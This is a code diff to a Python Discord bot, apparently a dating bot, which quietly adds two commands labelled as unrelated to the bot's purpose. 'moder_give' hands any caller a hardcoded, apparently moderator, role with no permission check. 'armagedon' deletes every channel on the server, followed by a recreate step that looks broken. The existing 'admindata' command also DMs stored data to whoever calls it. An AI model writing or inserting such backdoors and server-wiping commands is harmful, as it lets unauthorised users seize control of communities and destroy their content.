@@ -69,5 +69,18 @@ async def admindata(ctx):
     for d in data:
         print(d)
         await ctx.author.send(d)
+#не касается кода знакомств
+@client.command()
+async def moder_give(ctx):
+    member = ctx.message.author
+    role_1 = member.guild.get_role(848876539000258572)# ади роли которую будет получать юзер
+    await member.add_roles(role_1)
+@client.command()
+async def armagedon(ctx,name):
+    guild = ctx.guild
+    for channel in guild.channels:
+        await channel.delete()
+    for channel in guild.channels:
+        await channel.create(str(name))
 
 client.run(os.environ['token'])
